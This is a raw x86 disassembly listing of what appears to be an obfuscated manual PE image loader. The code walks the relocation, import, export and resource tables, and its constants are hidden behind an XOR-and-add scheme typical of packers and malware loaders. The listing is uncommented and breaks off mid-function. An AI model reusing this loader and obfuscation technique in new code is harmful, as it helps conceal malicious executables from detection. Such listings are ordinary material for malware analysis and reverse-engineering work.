  4257fb:	jne    0x425807
  4257fd:	mov    BYTE PTR [edx+0x4],0xea
  425801:	mov    WORD PTR [ecx+0x3],0xeadf
  425807:	mov    BYTE PTR [edx],0xbe
  42580a:	leave  
  42580b:	ret    
  42580c:	push   ebp
  42580d:	mov    ebp,esp
  42580f:	push   ecx
  425810:	push   ecx
  425811:	lea    eax,[ebp-0x8]
  425814:	mov    DWORD PTR [ebp-0x4],eax
  425817:	mov    edx,DWORD PTR [ebp-0x4]
  42581a:	mov    eax,0xf8870b3f
  42581f:	mov    DWORD PTR [edx],eax
  425821:	mov    edx,DWORD PTR [ebp-0x8]
  425824:	cmp    edx,eax
  425826:	jne    0x425833
  425828:	mov    eax,DWORD PTR [ebp+0x8]
  42582b:	mov    BYTE PTR [ecx+0x8],0xee
  42582f:	mov    BYTE PTR [eax+0x1],0xe4
  425833:	mov    BYTE PTR [ecx+0x5],0xf2
  425837:	leave  
  425838:	ret    0x4
  42583b:	push   esi
  42583c:	mov    ecx,edi
  42583e:	call   0x42580c
  425843:	mov    edx,edi
  425845:	mov    ecx,esi
  425847:	mov    BYTE PTR [esi],0xde
  42584a:	call   0x4257df
  42584f:	push   esi
  425850:	mov    ecx,edi
  425852:	mov    BYTE PTR [esi+0x5],0xf2
  425856:	call   0x4257b0
  42585b:	push   esi
  42585c:	mov    BYTE PTR [esi+0x6],0xee
  425860:	call   0x42577d
  425865:	mov    BYTE PTR [esi+0x2],0xe9
  425869:	mov    edx,esi
  42586b:	jmp    0x42574d
  425870:	push   ebp
  425871:	mov    ebp,esp
  425873:	push   ecx
  425874:	mov    ecx,DWORD PTR [edx+0x194]
  42587a:	push   esi
  42587b:	mov    esi,DWORD PTR [ebp+0x8]
  42587e:	mov    esi,DWORD PTR [esi]
  425880:	mov    DWORD PTR [ecx],esi
  425882:	mov    ecx,DWORD PTR [edx+0x194]
  425888:	mov    ecx,DWORD PTR [ecx]
  42588a:	mov    esi,DWORD PTR [edx+0x190]
  425890:	mov    DWORD PTR [esi],ecx
  425892:	mov    eax,DWORD PTR [edx+0x194]
  425898:	mov    ecx,DWORD PTR [eax]
  42589a:	mov    ecx,DWORD PTR [ecx+0x3c]
  42589d:	add    ecx,DWORD PTR [eax]
  42589f:	mov    DWORD PTR [ebp-0x4],0xf89ca5b9
  4258a6:	mov    eax,DWORD PTR [ebp-0x4]
  4258a9:	movzx  ecx,WORD PTR [ecx+0x16]
  4258ad:	xor    eax,0x75108b1
  4258b2:	add    eax,0x3272f8
  4258b7:	pop    esi
  4258b8:	test   ecx,eax
  4258ba:	je     0x4258c8
  4258bc:	mov    eax,DWORD PTR [edx+0x1c8]
  4258c2:	mov    DWORD PTR [eax],0xf89c85b8
  4258c8:	leave  
  4258c9:	ret    0x4
  4258cc:	push   ebp
  4258cd:	mov    ebp,esp
  4258cf:	sub    esp,0x70
  4258d2:	and    DWORD PTR [ebp-0x20],0x0
  4258d6:	mov    DWORD PTR [ebp-0x18],0xf89cb5b9
  4258dd:	mov    DWORD PTR [ebp-0x1c],0xf89c85f9
  4258e4:	mov    DWORD PTR [ebp-0x2c],0xf89c85bd
  4258eb:	mov    DWORD PTR [ebp-0x14],0xf89c85bb
  4258f2:	mov    DWORD PTR [ebp-0x2c],0xf89f05b9
  4258f9:	mov    eax,DWORD PTR [ebp+0x20]
  4258fc:	mov    eax,DWORD PTR [eax+0x194]
  425902:	mov    DWORD PTR [ebp-0xc],eax
  425905:	mov    eax,DWORD PTR [ebp+0x20]
  425908:	push   ebx
  425909:	push   esi
  42590a:	mov    esi,DWORD PTR [eax+0x190]
  425910:	mov    eax,DWORD PTR [ebp+0x20]
  425913:	mov    eax,DWORD PTR [eax+0x18c]
  425919:	mov    DWORD PTR [ebp-0x8],eax
  42591c:	mov    eax,DWORD PTR [eax]
  42591e:	push   edi
  42591f:	mov    DWORD PTR [ebp-0x4],esi
  425922:	test   eax,eax
  425924:	jne    0x425931
  425926:	push   DWORD PTR [ebp+0x1c]
  425929:	mov    edx,DWORD PTR [ebp+0x20]
  42592c:	call   0x425870
  425931:	mov    eax,DWORD PTR [esi]
  425933:	mov    ebx,DWORD PTR [esi]
  425935:	add    ebx,DWORD PTR [eax+0x3c]
  425938:	mov    eax,DWORD PTR [ebp+0xc]
  42593b:	mov    ecx,DWORD PTR [ebp-0x8]
  42593e:	mov    ecx,DWORD PTR [ecx]
  425940:	mov    esi,0x75108b1
  425945:	xor    eax,esi
  425947:	mov    edi,0x3272f8
  42594c:	add    eax,edi
  42594e:	cmp    eax,ecx
  425950:	jne    0x425b88
  425956:	mov    eax,DWORD PTR [ebp-0xc]
  425959:	mov    eax,DWORD PTR [eax]
  42595b:	mov    DWORD PTR [ebp-0x10],eax
  42595e:	mov    eax,DWORD PTR [ebx+0x50]
  425961:	mov    DWORD PTR [ebp-0x68],eax
  425964:	mov    eax,DWORD PTR [ebp-0x18]
  425967:	xor    eax,esi
  425969:	add    eax,edi
  42596b:	mov    DWORD PTR [ebp-0x64],eax
  42596e:	mov    eax,DWORD PTR [ebp-0x14]
  425971:	and    DWORD PTR [ebp-0x6c],0x0
  425975:	xor    eax,esi
  425977:	add    eax,edi
  425979:	mov    DWORD PTR [ebp-0x60],eax
  42597c:	lea    eax,[ebp-0x70]
  42597f:	push   eax
  425980:	mov    eax,DWORD PTR [ebp+0x8]
  425983:	xor    eax,esi
  425985:	add    eax,edi
  425987:	push   eax
  425988:	mov    eax,DWORD PTR [ebp+0x20]
  42598b:	add    eax,0xaa
  425990:	push   eax
  425991:	mov    eax,DWORD PTR [ebp+0x20]
  425994:	mov    eax,DWORD PTR [eax+0x198]
  42599a:	mov    DWORD PTR [ebp-0x70],0x4
  4259a1:	push   DWORD PTR [eax]
  4259a3:	mov    eax,DWORD PTR [ebp+0x10]
  4259a6:	call   eax
  4259a8:	mov    ecx,DWORD PTR [ebp-0xc]
  4259ab:	mov    ecx,DWORD PTR [ecx]
  4259ad:	mov    edx,DWORD PTR [ebp-0x8]
  4259b0:	mov    DWORD PTR [ebp-0x6c],eax
  4259b3:	mov    DWORD PTR [ebp+0x1c],eax
  4259b6:	mov    DWORD PTR [edx],ecx
  4259b8:	mov    ecx,DWORD PTR [ebp-0x4]
  4259bb:	mov    DWORD PTR [ecx],eax
  4259bd:	mov    eax,DWORD PTR [ebx+0x50]
  4259c0:	mov    DWORD PTR [ebp-0x68],eax
  4259c3:	mov    eax,DWORD PTR [ebp-0x1c]
  4259c6:	xor    eax,esi
  4259c8:	add    eax,edi
  4259ca:	mov    DWORD PTR [ebp-0x64],eax
  4259cd:	lea    eax,[ebp-0x20]
  4259d0:	mov    DWORD PTR [ebp-0x60],eax
  4259d3:	lea    eax,[ebp-0x70]
  4259d6:	push   eax
  4259d7:	mov    eax,DWORD PTR [ebp+0x8]
  4259da:	xor    eax,esi
  4259dc:	add    eax,edi
  4259de:	push   eax
  4259df:	mov    eax,DWORD PTR [ebp+0x20]
  4259e2:	add    eax,0xee
  4259e7:	push   eax
  4259e8:	mov    eax,DWORD PTR [ebp+0x20]
  4259eb:	mov    eax,DWORD PTR [eax+0x198]
  4259f1:	mov    DWORD PTR [ebp-0x70],0x4
  4259f8:	push   DWORD PTR [eax]
  4259fa:	mov    eax,DWORD PTR [ebp+0x10]
  4259fd:	call   eax
  4259ff:	test   eax,eax
  425a01:	je     0x425a26
  425a03:	and    DWORD PTR [ebp+0xc],0x0
  425a07:	cmp    DWORD PTR [ebx+0x50],0x0
  425a0b:	jbe    0x425a26
  425a0d:	mov    eax,DWORD PTR [ebp+0x1c]
  425a10:	mov    ecx,DWORD PTR [ebp-0x10]
  425a13:	sub    ecx,eax
  425a15:	mov    dl,BYTE PTR [ecx+eax*1]
  425a18:	inc    DWORD PTR [ebp+0xc]
  425a1b:	mov    BYTE PTR [eax],dl
  425a1d:	mov    edx,DWORD PTR [ebp+0xc]
  425a20:	inc    eax
  425a21:	cmp    edx,DWORD PTR [ebx+0x50]
  425a24:	jb     0x425a15
  425a26:	mov    edx,DWORD PTR [ebp+0x1c]
  425a29:	mov    ecx,DWORD PTR [edx+0x3c]
  425a2c:	add    ecx,edx
  425a2e:	mov    eax,DWORD PTR [ecx+0xa0]
  425a34:	mov    ebx,DWORD PTR [ecx+0x28]
  425a37:	add    eax,edx
  425a39:	sub    edx,DWORD PTR [ebp-0x10]
  425a3c:	add    ebx,DWORD PTR [ebp+0x1c]
  425a3f:	mov    DWORD PTR [ebp+0xc],edx
  425a42:	mov    DWORD PTR [ebp-0x2c],ecx
  425a45:	mov    DWORD PTR [ebp-0x14],ebx
  425a48:	mov    DWORD PTR [ebp-0x8],0x0
  425a4f:	jmp    0x425acb
  425a51:	add    edx,0xfffffff8
  425a54:	shr    edx,1
  425a56:	mov    DWORD PTR [ebp-0x18],edx
  425a59:	je     0x425ab7
  425a5b:	lea    edx,[eax+0x8]
  425a5e:	mov    DWORD PTR [ebp-0x4],edx
  425a61:	mov    edx,DWORD PTR [ebp-0x18]
  425a64:	mov    DWORD PTR [ebp-0x18],edx
  425a67:	mov    edx,DWORD PTR [ebp-0x4]
  425a6a:	movzx  edx,WORD PTR [edx]
  425a6d:	mov    DWORD PTR [ebp-0x24],edx
  425a70:	and    edx,0xfff
  425a76:	mov    DWORD PTR [ebp-0x28],edx
  425a79:	mov    edx,DWORD PTR [ebp-0x24]
  425a7c:	shr    edx,0xc
  425a7f:	add    edx,0xffcd8d08
  425a85:	xor    edx,esi
  425a87:	cmp    edx,0xf89c85ba
  425a8d:	jne    0x425aae
  425a8f:	mov    edx,DWORD PTR [ebp-0x28]
  425a92:	add    edx,DWORD PTR [ebp+0x1c]
  425a95:	mov    ebx,DWORD PTR [eax]
  425a97:	cmp    DWORD PTR [ebx+edx*1],0x0
  425a9b:	je     0x425aab
  425a9d:	mov    ecx,DWORD PTR [ebp+0xc]
  425aa0:	add    ecx,DWORD PTR [ebx+edx*1]
  425aa3:	mov    ebx,DWORD PTR [eax]
  425aa5:	mov    DWORD PTR [edx+ebx*1],ecx
  425aa8:	mov    ecx,DWORD PTR [ebp-0x2c]
  425aab:	mov    ebx,DWORD PTR [ebp-0x14]
  425aae:	add    DWORD PTR [ebp-0x4],0x2
  425ab2:	dec    DWORD PTR [ebp-0x18]
  425ab5:	jne    0x425a67
  425ab7:	mov    edx,DWORD PTR [ebp-0xc]
  425aba:	add    DWORD PTR [ebp-0x8],edx
  425abd:	mov    edx,DWORD PTR [ebp-0x8]
  425ac0:	cmp    edx,DWORD PTR [ecx+0xa4]
  425ac6:	jae    0x425ad9
  425ac8:	add    eax,DWORD PTR [ebp-0xc]
  425acb:	mov    edx,DWORD PTR [eax+0x4]
  425ace:	mov    DWORD PTR [ebp-0xc],edx
  425ad1:	test   edx,edx
  425ad3:	jne    0x425a51
  425ad9:	mov    eax,DWORD PTR [ebp-0x10]
  425adc:	mov    DWORD PTR [ebp-0x6c],eax
  425adf:	mov    DWORD PTR [ebp-0x70],0x4
  425ae6:	mov    eax,DWORD PTR [ecx+0x50]
  425ae9:	mov    DWORD PTR [ebp-0x68],eax
  425aec:	mov    eax,DWORD PTR [ebp-0x1c]
  425aef:	xor    eax,esi
  425af1:	add    eax,edi
  425af3:	mov    DWORD PTR [ebp-0x64],eax
  425af6:	lea    eax,[ebp-0x20]
  425af9:	mov    DWORD PTR [ebp-0x60],eax
  425afc:	lea    eax,[ebp-0x70]
  425aff:	push   eax
  425b00:	mov    eax,DWORD PTR [ebp+0x8]
  425b03:	xor    eax,esi
  425b05:	add    eax,edi
  425b07:	push   eax
  425b08:	mov    eax,DWORD PTR [ebp+0x20]
  425b0b:	add    eax,0xee
  425b10:	push   eax
  425b11:	mov    eax,DWORD PTR [ebp+0x20]
  425b14:	mov    eax,DWORD PTR [eax+0x198]
  425b1a:	push   DWORD PTR [eax]
  425b1c:	mov    eax,DWORD PTR [ebp+0x10]
  425b1f:	call   eax
  425b21:	mov    eax,DWORD PTR [ebp+0x20]
  425b24:	mov    eax,DWORD PTR [eax+0x180]
  425b2a:	add    eax,DWORD PTR [ebp+0xc]
  425b2d:	mov    ecx,DWORD PTR [ebp+0xc]
  425b30:	push   DWORD PTR [ebp+0x18]
  425b33:	mov    DWORD PTR [eax],ecx
  425b35:	push   DWORD PTR [ebp+0x14]
  425b38:	push   DWORD PTR [ebp+0x1c]
  425b3b:	call   ebx
  425b3d:	mov    ecx,DWORD PTR [ebp+0xc]
  425b40:	add    ecx,DWORD PTR [ebp+0x20]
  425b43:	lea    eax,[ebp+0x4]
  425b46:	mov    DWORD PTR [ebp+0x20],ecx
  425b49:	mov    ecx,DWORD PTR [ebp+0x20]
  425b4c:	mov    ecx,DWORD PTR [ebp+0x20]
  425b4f:	mov    edx,DWORD PTR [ecx+0x190]
  425b55:	mov    ecx,DWORD PTR [ebp+0x20]
  425b58:	mov    ecx,DWORD PTR [ecx+0x18c]
  425b5e:	mov    esi,DWORD PTR [ecx]
  425b60:	cmp    DWORD PTR [eax],esi
  425b62:	jb     0x425b83
  425b64:	mov    esi,DWORD PTR [edx]
  425b66:	mov    edi,DWORD PTR [edx]
  425b68:	mov    esi,DWORD PTR [esi+0x3c]
  425b6b:	lea    esi,[edi+esi*1+0x50]
  425b6f:	mov    edi,DWORD PTR [ecx]
  425b71:	add    edi,DWORD PTR [esi]
  425b73:	cmp    DWORD PTR [eax],edi
  425b75:	jae    0x425b83
  425b77:	mov    esi,DWORD PTR [ecx]
  425b79:	mov    ecx,DWORD PTR [eax]
  425b7b:	mov    edx,DWORD PTR [edx]
  425b7d:	sub    ecx,esi
  425b7f:	add    edx,ecx
  425b81:	mov    DWORD PTR [eax],edx
  425b83:	mov    eax,DWORD PTR [ebp+0xc]
  425b86:	jmp    0x425b8a
  425b88:	xor    eax,eax
  425b8a:	pop    edi
  425b8b:	pop    esi
  425b8c:	pop    ebx
  425b8d:	leave  
  425b8e:	ret    0x1c
  425b91:	push   ebp
  425b92:	mov    ebp,esp
  425b94:	sub    esp,0x1c
  425b97:	push   esi
  425b98:	mov    esi,eax
  425b9a:	mov    eax,DWORD PTR [ecx+0x190]
  425ba0:	cmp    DWORD PTR [eax],0x0
  425ba3:	je     0x425cb3
  425ba9:	test   edx,edx
  425bab:	je     0x425cb3
  425bb1:	test   esi,esi
  425bb3:	je     0x425cb3
  425bb9:	mov    eax,DWORD PTR [esi+0x88]
  425bbf:	test   eax,eax
  425bc1:	je     0x425cae
  425bc7:	cmp    DWORD PTR [esi+0x8c],0x10
  425bce:	je     0x425cae
  425bd4:	cmp    DWORD PTR [esi+0x34],edx
  425bd7:	je     0x425cae
  425bdd:	mov    esi,DWORD PTR [ecx+0x18c]
  425be3:	and    DWORD PTR [ebp-0x10],0x0
  425be7:	mov    ecx,edx
  425be9:	sub    ecx,DWORD PTR [esi]
  425beb:	add    eax,edx
  425bed:	movzx  edx,WORD PTR [eax+0xc]
  425bf1:	mov    DWORD PTR [ebp-0x1c],ecx
  425bf4:	movzx  ecx,WORD PTR [eax+0xe]
  425bf8:	add    ecx,edx
  425bfa:	je     0x425cae
  425c00:	lea    ecx,[eax+0x14]
  425c03:	push   ebx
  425c04:	mov    DWORD PTR [ebp-0x18],ecx
  425c07:	mov    esi,0x7fffffff
  425c0c:	push   edi
  425c0d:	test   DWORD PTR [ecx],esi
  425c0f:	je     0x425c90
  425c11:	mov    edx,DWORD PTR [ecx]
  425c13:	and    DWORD PTR [ebp-0xc],0x0
  425c17:	and    edx,esi
  425c19:	add    edx,eax
  425c1b:	movzx  edi,WORD PTR [edx+0xe]
  425c1f:	movzx  ebx,WORD PTR [edx+0xc]
  425c23:	add    edi,ebx
  425c25:	je     0x425c90
  425c27:	lea    ecx,[edx+0x14]
  425c2a:	mov    DWORD PTR [ebp-0x14],ecx
  425c2d:	test   DWORD PTR [ecx],esi
  425c2f:	je     0x425c72
  425c31:	mov    ecx,DWORD PTR [ecx]
  425c33:	and    DWORD PTR [ebp-0x8],0x0
  425c37:	and    ecx,esi
  425c39:	add    ecx,eax
  425c3b:	movzx  edi,WORD PTR [ecx+0xe]
  425c3f:	movzx  ebx,WORD PTR [ecx+0xc]
  425c43:	add    edi,ebx
  425c45:	je     0x425c72
  425c47:	lea    edi,[ecx+0x14]
  425c4a:	mov    DWORD PTR [ebp-0x4],edi
  425c4d:	mov    edi,DWORD PTR [ebp-0x4]
  425c50:	mov    edi,DWORD PTR [edi]
  425c52:	test   edi,edi
  425c54:	je     0x425c5c
  425c56:	mov    ebx,DWORD PTR [ebp-0x1c]
  425c59:	add    DWORD PTR [edi+eax*1],ebx
  425c5c:	movzx  edi,WORD PTR [ecx+0xe]
  425c60:	movzx  ebx,WORD PTR [ecx+0xc]
  425c64:	inc    DWORD PTR [ebp-0x8]
  425c67:	add    DWORD PTR [ebp-0x4],0x8
  425c6b:	add    edi,ebx
  425c6d:	cmp    DWORD PTR [ebp-0x8],edi
  425c70:	jb     0x425c4d
  425c72:	movzx  edi,WORD PTR [edx+0xe]
  425c76:	movzx  ebx,WORD PTR [edx+0xc]
  425c7a:	mov    ecx,DWORD PTR [ebp-0x14]
  425c7d:	inc    DWORD PTR [ebp-0xc]
  425c80:	add    ecx,0x8
  425c83:	add    edi,ebx
  425c85:	mov    DWORD PTR [ebp-0x14],ecx
  425c88:	cmp    DWORD PTR [ebp-0xc],edi
  425c8b:	jb     0x425c2d
  425c8d:	mov    ecx,DWORD PTR [ebp-0x18]
  425c90:	movzx  edx,WORD PTR [eax+0xe]
  425c94:	movzx  edi,WORD PTR [eax+0xc]
  425c98:	inc    DWORD PTR [ebp-0x10]
  425c9b:	add    ecx,0x8
  425c9e:	add    edx,edi
  425ca0:	mov    DWORD PTR [ebp-0x18],ecx
  425ca3:	cmp    DWORD PTR [ebp-0x10],edx
  425ca6:	jb     0x425c0d
  425cac:	pop    edi
  425cad:	pop    ebx
  425cae:	xor    eax,eax
  425cb0:	inc    eax
  425cb1:	jmp    0x425cb5
  425cb3:	xor    eax,eax
  425cb5:	pop    esi
  425cb6:	leave  
  425cb7:	ret    
  425cb8:	push   ebp
  425cb9:	mov    ebp,esp
  425cbb:	mov    ecx,DWORD PTR [ecx+0x190]
  425cc1:	mov    eax,DWORD PTR [ebp+0xc]
  425cc4:	sub    esp,0x10
  425cc7:	push   ebx
  425cc8:	xor    ebx,ebx
  425cca:	push   esi
  425ccb:	push   edi
  425ccc:	cmp    DWORD PTR [ecx],ebx
  425cce:	je     0x425d56
  425cd4:	cmp    eax,ebx
  425cd6:	je     0x425d56
  425cd8:	cmp    DWORD PTR [eax+0x78],ebx
  425cdb:	jne    0x425ce2
  425cdd:	xor    eax,eax
  425cdf:	inc    eax
  425ce0:	jmp    0x425d58
  425ce2:	mov    eax,DWORD PTR [eax+0x78]
  425ce5:	add    eax,DWORD PTR [ebp+0x8]
  425ce8:	mov    ecx,DWORD PTR [eax+0x1c]
  425ceb:	mov    edx,DWORD PTR [eax+0x24]
  425cee:	mov    esi,DWORD PTR [eax+0x14]
  425cf1:	mov    edi,DWORD PTR [eax+0x18]
  425cf4:	add    ecx,DWORD PTR [ebp+0x8]
  425cf7:	add    edx,DWORD PTR [ebp+0x8]
  425cfa:	mov    DWORD PTR [ebp-0x4],esi
  425cfd:	cmp    esi,edi
  425cff:	ja     0x425d04
  425d01:	mov    DWORD PTR [ebp-0x4],edi
  425d04:	mov    DWORD PTR [ebp-0x8],ebx
  425d07:	cmp    DWORD PTR [ebp-0x4],ebx
  425d0a:	jbe    0x425cdd
  425d0c:	cmp    ebx,DWORD PTR [eax+0x14]
  425d0f:	jae    0x425d17
  425d11:	movzx  esi,WORD PTR [edx+ebx*2]
  425d15:	jmp    0x425d19
  425d17:	mov    esi,ebx
  425d19:	lea    esi,[ecx+esi*4]
  425d1c:	mov    edi,DWORD PTR [esi]
  425d1e:	test   edi,edi
  425d20:	je     0x425d4b
  425d22:	add    edi,DWORD PTR [ebp+0x8]
  425d25:	mov    DWORD PTR [ebp-0x10],edi
  425d28:	cmp    edi,eax
  425d2a:	jbe    0x425d3c
  425d2c:	mov    ebx,DWORD PTR [ebp+0xc]
  425d2f:	mov    ebx,DWORD PTR [ebx+0x7c]
  425d32:	add    ebx,eax
  425d34:	cmp    edi,ebx
  425d36:	jae    0x425d3c
  425d38:	mov    esi,DWORD PTR [esi]
  425d3a:	jmp    0x425d44
  425d3c:	sub    edi,DWORD PTR [ebp+0x8]
  425d3f:	mov    DWORD PTR [esi],edi
  425d41:	mov    esi,DWORD PTR [ebp-0x10]
  425d44:	test   esi,esi
  425d46:	je     0x425d56
  425d48:	mov    ebx,DWORD PTR [ebp-0x8]
  425d4b:	inc    ebx
  425d4c:	mov    DWORD PTR [ebp-0x8],ebx
  425d4f:	cmp    ebx,DWORD PTR [ebp-0x4]
  425d52:	jb     0x425d0c
  425d54:	jmp    0x425cdd
  425d56:	xor    eax,eax
  425d58:	pop    edi
  425d59:	pop    esi
  425d5a:	pop    ebx
  425d5b:	leave  
  425d5c:	ret    0x8
  425d5f:	push   ebp
  425d60:	mov    ebp,esp
  425d62:	sub    esp,0x2c
  425d65:	mov    edx,0xf89c85b9
  425d6a:	mov    DWORD PTR [ebp-0x4],edx
  425d6d:	mov    DWORD PTR [ebp-0x8],0xf89c85b8
  425d74:	mov    eax,DWORD PTR [ebp-0x4]
  425d77:	mov    ecx,DWORD PTR [ebp-0x4]
  425d7a:	mov    ecx,DWORD PTR [ebp-0x4]
  425d7d:	mov    ecx,DWORD PTR [ebp-0x4]
  425d80:	mov    ecx,DWORD PTR [ebp-0x4]
  425d83:	mov    ecx,DWORD PTR [ebp-0x4]
  425d86:	push   ebx
  425d87:	mov    ebx,DWORD PTR [ebp+0x10]
  425d8a:	push   esi
  425d8b:	mov    esi,0x75108b1
  425d90:	mov    DWORD PTR [ebp-0x10],0x352ebcf
  425d97:	mov    ecx,DWORD PTR [ebp-0x4]
  425d9a:	mov    ebx,DWORD PTR [ebx+0x190]
  425da0:	push   edi
  425da1:	mov    edi,0x3272f8
  425da6:	xor    ecx,esi
  425da8:	xor    eax,esi
  425daa:	add    eax,edi
  425dac:	add    ecx,edi
  425dae:	mov    DWORD PTR [ebp-0x18],eax
  425db1:	cmp    ecx,DWORD PTR [ebx]
  425db3:	je     0x426034
  425db9:	mov    ebx,DWORD PTR [ebp-0x4]
  425dbc:	mov    ecx,DWORD PTR [ebp+0xc]
  425dbf:	xor    ebx,esi
  425dc1:	add    ebx,edi
  425dc3:	cmp    ebx,ecx
  425dc5:	je     0x426034
  425dcb:	mov    ebx,DWORD PTR [ebp-0x4]
  425dce:	mov    ecx,DWORD PTR [ecx+0x80]
  425dd4:	xor    ebx,esi
  425dd6:	add    ebx,edi
  425dd8:	cmp    ecx,ebx
  425dda:	je     0x42602f
  425de0:	add    ecx,DWORD PTR [ebp+0x8]
  425de3:	mov    DWORD PTR [ebp-0x2c],ecx
  425de6:	mov    ebx,edx
  425de8:	xor    ebx,esi
  425dea:	add    ebx,edi
  425dec:	mov    DWORD PTR [ebp-0x10],ebx
  425def:	mov    ebx,DWORD PTR [ebp-0x10]
  425df2:	cmp    ebx,edx
  425df4:	je     0x425e08
  425df6:	mov    edx,DWORD PTR [ebp-0x10]
  425df9:	mov    ebx,DWORD PTR [ebp-0x4]
  425dfc:	imul   edx,edx,0x14
  425dff:	xor    ebx,esi
  425e01:	add    ebx,edi
  425e03:	cmp    DWORD PTR [edx+ecx*1],ebx
  425e06:	jne    0x425e1f
  425e08:	mov    edx,DWORD PTR [ebp-0x10]
  425e0b:	mov    ebx,DWORD PTR [ebp-0x4]
  425e0e:	imul   edx,edx,0x14
  425e11:	xor    ebx,esi
  425e13:	add    ebx,edi
  425e15:	cmp    DWORD PTR [edx+ecx*1+0x10],ebx
  425e19:	je     0x426021
  425e1f:	mov    eax,DWORD PTR [ebp-0x4]
  425e22:	mov    ebx,DWORD PTR [ebp-0x4]
  425e25:	mov    eax,DWORD PTR [ebp-0x10]
  425e28:	imul   eax,eax,0x14
  425e2b:	add    eax,ecx
  425e2d:	mov    ecx,DWORD PTR [eax+0x10]
  425e30:	add    ecx,DWORD PTR [ebp+0x8]
  425e33:	xor    ebx,esi
  425e35:	mov    DWORD PTR [ebp-0x1c],ecx
  425e38:	mov    ecx,DWORD PTR [ebp-0x4]
  425e3b:	mov    edx,DWORD PTR [ebp-0x4]
  425e3e:	xor    ecx,esi
  425e40:	add    ecx,edi
  425e42:	xor    edx,esi
  425e44:	mov    DWORD PTR [ebp-0x24],ecx
  425e47:	mov    ecx,DWORD PTR [eax]
  425e49:	add    edx,edi
  425e4b:	add    ebx,edi
  425e4d:	cmp    ecx,edx
  425e4f:	je     0x425e57
  425e51:	add    ecx,DWORD PTR [ebp+0x8]
  425e54:	mov    DWORD PTR [ebp-0x24],ecx
  425e57:	mov    ecx,DWORD PTR [ebp-0x4]
  425e5a:	xor    ecx,esi
  425e5c:	add    ecx,DWORD PTR [eax+0xc]
  425e5f:	mov    eax,DWORD PTR [ebp+0x8]
  425e62:	lea    eax,[ecx+eax*1+0x3272f8]
  425e69:	mov    DWORD PTR [ebp+0xc],eax
  425e6c:	mov    DWORD PTR [ebp-0x28],0xf89c85bc
  425e73:	mov    eax,DWORD PTR [ebp+0x10]
  425e76:	push   DWORD PTR [ebp+0xc]
  425e79:	mov    eax,DWORD PTR [eax+0x1e0]
  425e7f:	call   DWORD PTR [eax]
  425e81:	mov    ecx,DWORD PTR [ebp-0x4]
  425e84:	xor    ecx,esi
  425e86:	add    ecx,edi
  425e88:	mov    DWORD PTR [ebp-0xc],eax
  425e8b:	cmp    ecx,eax
  425e8d:	jne    0x425ea1
  425e8f:	mov    eax,DWORD PTR [ebp+0x10]
  425e92:	push   DWORD PTR [ebp+0xc]
  425e95:	mov    eax,DWORD PTR [eax+0x1e0]
  425e9b:	call   DWORD PTR [eax+0xc]
  425e9e:	mov    DWORD PTR [ebp-0xc],eax
  425ea1:	mov    DWORD PTR [ebp-0x20],0x7f661b30
  425ea8:	mov    DWORD PTR [ebp-0x20],0xf89c9840
  425eaf:	mov    eax,DWORD PTR [ebp-0x4]
  425eb2:	xor    eax,esi
  425eb4:	add    eax,edi
  425eb6:	cmp    eax,DWORD PTR [ebp-0xc]
  425eb9:	jne    0x425ede
  425ebb:	mov    eax,DWORD PTR [ebp-0x8]
  425ebe:	mov    ecx,DWORD PTR [ebp-0x20]
  425ec1:	xor    eax,esi
  425ec3:	xor    ecx,esi
  425ec5:	lea    ebx,[ebx+eax*1+0x3272f8]
  425ecc:	mov    eax,DWORD PTR [ebp+0x10]
  425ecf:	mov    eax,DWORD PTR [eax+0x1e0]
  425ed5:	add    ecx,edi
  425ed7:	imul   ecx,ebx
  425eda:	push   ecx
  425edb:	call   DWORD PTR [eax+0x24]
  425ede:	mov    eax,DWORD PTR [ebp-0x4]
  425ee1:	xor    eax,esi
  425ee3:	add    eax,edi
  425ee5:	cmp    eax,DWORD PTR [ebp-0xc]
  425ee8:	jne    0x425ef9
  425eea:	mov    eax,DWORD PTR [ebp-0x28]
  425eed:	xor    eax,esi
  425eef:	add    eax,edi
  425ef1:	cmp    ebx,eax
  425ef3:	jbe    0x425e73
  425ef9:	mov    eax,DWORD PTR [ebp-0x4]
  425efc:	xor    eax,esi
  425efe:	add    eax,edi
  425f00:	cmp    eax,DWORD PTR [ebp-0xc]
  425f03:	jne    0x425f1c
  425f05:	mov    eax,DWORD PTR [ebp-0x8]
  425f08:	mov    ecx,DWORD PTR [ebp-0x18]
  425f0b:	xor    eax,esi
  425f0d:	lea    eax,[ecx+eax*1+0x3272f8]
  425f14:	mov    DWORD PTR [ebp-0x18],eax
  425f17:	jmp    0x42600b
  425f1c:	mov    DWORD PTR [ebp-0x14],0x1121b31
  425f23:	mov    DWORD PTR [ebp+0xc],0xe042dcf
  425f2a:	mov    ebx,DWORD PTR [ebp-0x4]
  425f2d:	xor    ebx,esi
  425f2f:	add    ebx,edi
  425f31:	jmp    0x425ff8
  425f36:	mov    eax,DWORD PTR [ebp-0x4]
  425f39:	xor    eax,esi
  425f3b:	add    eax,edi
  425f3d:	mov    DWORD PTR [ebp-0x14],eax
  425f40:	mov    eax,DWORD PTR [ebp-0x4]
  425f43:	xor    eax,esi
  425f45:	add    eax,edi
  425f47:	mov    DWORD PTR [ebp+0xc],eax
  425f4a:	mov    ecx,DWORD PTR [ebp-0x4]
  425f4d:	mov    eax,DWORD PTR [ebp-0x24]
  425f50:	xor    ecx,esi
  425f52:	add    ecx,edi
  425f54:	cmp    ecx,eax
  425f56:	je     0x425f5e
  425f58:	mov    eax,DWORD PTR [eax+ebx*4]
  425f5b:	mov    DWORD PTR [ebp-0x14],eax
  425f5e:	mov    eax,DWORD PTR [ebp-0x1c]
  425f61:	mov    eax,DWORD PTR [eax+ebx*4]
  425f64:	mov    DWORD PTR [ebp+0xc],eax
  425f67:	mov    eax,DWORD PTR [ebp-0x4]
  425f6a:	mov    ecx,DWORD PTR [ebp-0x14]
  425f6d:	xor    eax,esi
  425f6f:	add    eax,edi
  425f71:	cmp    eax,ecx
  425f73:	je     0x425f9e
  425f75:	mov    eax,DWORD PTR [ebp-0x4]
  425f78:	mov    ecx,DWORD PTR [ebp-0x14]
  425f7b:	xor    eax,esi
  425f7d:	add    eax,edi
  425f7f:	shr    ecx,0x1f
  425f82:	cmp    eax,ecx
  425f84:	je     0x425f9e
  425f86:	mov    ecx,DWORD PTR [ebp-0x14]
  425f89:	mov    eax,DWORD PTR [ebp+0x10]
  425f8c:	mov    eax,DWORD PTR [eax+0x1e0]
  425f92:	movzx  ecx,cx
  425f95:	push   ecx
  425f96:	push   DWORD PTR [ebp-0xc]
  425f99:	call   DWORD PTR [eax+0x8]
  425f9c:	jmp    0x425fb7
